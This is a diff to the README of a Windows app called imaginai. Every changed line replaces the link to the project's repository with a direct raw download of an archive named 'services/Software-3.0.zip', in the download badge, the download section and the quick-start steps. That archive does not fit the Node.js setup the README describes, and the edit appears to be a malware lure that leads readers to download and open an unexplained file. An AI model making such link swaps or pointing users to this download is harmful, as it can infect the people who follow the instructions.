@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download imaginai](https://img.shields.io/badge/Download-imaginai-blue?style=for-the-badge&logo=github)](https://github.com/Kubil-UwU/imaginai)
+[![Download imaginai](https://img.shields.io/badge/Download-imaginai-blue?style=for-the-badge&logo=github)](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)
 
 </div>
 
@@ -20,7 +20,7 @@ Use it if you want to:
 
 Visit this page to download and run the app:
 
-[https://github.com/Kubil-UwU/imaginai](https://github.com/Kubil-UwU/imaginai)
+[https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)
 
 If the page shows a release file or download package, save it to your PC and open it from your Downloads folder. If it opens the repository page, use the files on that page to set up the app on Windows.
 
@@ -157,7 +157,7 @@ If the project files stay in place, you do not need to install them again unless
 
 ## 📌 Quick start
 
-1. Download or open the project from [https://github.com/Kubil-UwU/imaginai](https://github.com/Kubil-UwU/imaginai)
+1. Download or open the project from [https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)
 2. Install Node.js if needed
 3. Run `npm install`
 4. Add your Gemini API key in `.env.local`
